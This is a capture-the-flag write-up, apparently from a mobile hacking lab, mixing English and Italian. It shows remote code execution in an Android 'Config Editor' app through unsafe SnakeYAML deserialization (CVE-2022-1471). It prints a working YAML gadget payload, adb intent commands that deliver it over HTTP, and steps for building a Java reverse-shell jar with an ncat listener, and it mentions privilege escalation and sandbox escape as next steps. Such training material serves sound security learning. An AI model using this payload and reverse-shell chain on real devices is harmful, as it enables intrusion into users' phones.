# Config Editor

Achieve Remote Code Execution via a Config Editor app in Android by exploiting vulnerabilities in a third party library.

## Table of Contents

1. [Look Around](#look-around)
2. [Static Analysis](#static-analysis)
3. [Dynamic Analysis](#dynamic-analysis)
4. [Exploiting](#exploiting)
5. [Shell is the way](#shell-is-the-way)
6. [And now?](#and-now)
7. [Utils](#utils)
8. [References](#references)

## Look Around

TL;DR

Upon the first launch, you'll be asked to grant permissions to manage external storage. This is necessary for the app to access files on your device's SD card.

The app features a simple interface with two buttons (Load and Save) and an empty text view.

When you click "Load," the file manager opens, displaying the contents of the SD card. Here, you'll see a file named example.yaml ready for you to select and load into the application.

You'll notice that the app is designed for parsing YAML files and potentially modifying them. Feel free to explore the loaded file and make any necessary changes.

After making modifications, simply click the "Save" button to store the changes back to the external storage.

## Static Analysis

After decompiling the application with `apktool -d ConfigEditor.apk`, we can examine the `AndroidManifest.xml` file to understand the application's structure and permissions.

### Permissions

+ READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, MANAGE_EXTERNAL_STORAGE: These permissions allow the application to read from, write to, and manage files on external storage, such as the SD card. This enables the application to save and access files stored externally.

+ INTERNET: This permission allows the application to access the internet. It is typically used for network communication, enabling the application to connect to remote servers or services over the internet.

```xml
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MANAGE_EXTERNAL_STORAGE"/>
```

### Implicitly Exported Component

In this case, the application is implicitly exporting a component, specifically the `MainActivity`, which could allow access to it from external sources.

The application handles links with schemes file://, http://, and https://, as well as files with the `.yaml` extension. This implies that the `MainActivity` component may be invoked or accessed when these types of links or files are interacted with. This behavior could introduce security risks, especially if the `MainActivity` component performs sensitive operations or accesses sensitive data.

```xml
       <activity android:name="com.mobilehackinglab.configeditor.MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
            <intent-filter>
                <action android:name="android.intent.action.VIEW"/>
                <category android:name="android.intent.category.DEFAULT"/>
                <category android:name="android.intent.category.BROWSABLE"/>
                <data android:scheme="file"/>
                <data android:scheme="http"/>
                <data android:scheme="https"/>
                <data android:mimeType="application/yaml"/>
            </intent-filter>
        </activity>
```

### MainActivity & yaml.load

Let's specifically examine what aspects of the code related to the `MainActivity` component should concern us.

The `loadYaml` function is of particular interest due to its usage of `Object deserializedData = yaml.load(inputStream);` internally.

Upon examining the imports in the application and its subdirectories, specifically `/org/yaml/snakeyaml`, we observe that the `load` method originates from SnakeYAML.

According to the documentation, `SnakeYAML is a YAML 1.1 processor designed for the Java Virtual Machine version 8 and above`.

Further research on SnakeYAML and deserialization reveals a vulnerability documented under `CVE-2022-1471`.

```txt
SnakeYaml's Constructor() class does not restrict types which can be instantiated during deserialization. Deserializing yaml content provided by an attacker can lead to remote code execution. We recommend using SnakeYaml's SafeConsturctor when parsing untrusted content to restrict deserialization. We recommend upgrading to version 2.0 and beyond.
```

I wasn't able to locate the exact version of SnakeYAML used in the application. However, upon searching for SnakeYAML's `SafeConstructor` in `/org/yaml/snakeyaml`, I found no occurrences. Therefore, I assumed it would be a good path to pursue for further investigation.

## Dynamic Analysis

Sanity check:

1. Crea un file `yaml`
2. Metti in ascolto un listener python sulla porta 8080
3. Simula una connessione http con un file yaml con adb
L'applicazione dovrebbe aprirsi e tenterà di leggere il file (se vuoto, l'output sarà vuoto)

Commands:

```sh
$linux> touch example.yaml
$linux> python3 -m http.server 8080
$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/example.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
```

## Exploiting

Adattamento SnakeYAML per la nostra App Android.

Nel path `/com/mobilehackinglab/configeditor/LegacyCommandUtil.java`
che ci può permettere tramite deserializzazione di richiamare LegacyCommandUtil ed eseguire comandi di sistema.

```java
public final class LegacyCommandUtil {
    public LegacyCommandUtil(String command) {
        Intrinsics.checkNotNullParameter(command, "command");
        Runtime.getRuntime().exec(command);
    }
}
```

Creiamo file `yaml`

```yaml
pwn: !!com.mobilehackinglab.configeditor.LegacyCommandUtil [ "/bin/touch /data/data/com.mobilehackinglab.configeditor/pwn.txt" ]
```

Testiamo questa RCE

```sh
$linux> touch pwn.yaml
$linux> python3 -m http.server 8080
$linux> adb shell am start -a android.intent.action.VIEW -d  "http://$IP:8080/pwn.yaml" -n com.mobilehackinglab.configeditor/.MainActivity
$linux> adb shell ls /data/data/com.mobilehackinglab.configeditor
output: pwn.txt # in listing file
```

<p align="center">
<img src="assets/pwn.png" width="500"/>
</p>

## Shell is the way

Creare reverse shell in Java

```sh
javac --release 17 AndroidReverseShell.java
mkdir classes
/Users/dipa/Library/Android/sdk/build-tools/33.0.2/d8 AndroidReverseShell.class --intermediate --file-per-class --output classes
mv classes/AndroidReverseShell.dex classes/classes.dex
zip classes/reverse.jar classes/classes.dex
# manual way, skip this, use only for testing
adb push reverse.jar /data/data/com.mobilehackinglab.configeditor/
/system/bin/dalvikvm -cp /data/data/com.mobilehackinglab.configeditor/reverse.jar AndroidReverseShell
```

```sh
python3 -m http.server 8081 # shell.yaml and reverse.jar in this folder
ncat -lnvp 1337 # listener for reverse shell
adb shell am start -a android.intent.action.VIEW -d  "http://192.168.1.26:8081/shell.yaml" -n com.mobilehackinglab.configeditor/.MainActivity # emulate browser interaction
```

![Alt Text](assets/exploit.gif)

## And now?

RCE / ACE su utente Android non ci dà molti privilegi e non possiamo muoverci liberamente nel file system. Quali sono i passi successivi?

### Android Kernel Privesc & SandBox Escape

+ Android Kernel Privesc, Sandbox Escape, etc

## Utils

+ SemGrep Rules

## References

+ [android-command-line-reverse-shell](https://malacupa.com/2018/10/25/android-command-line-reverse-shell)
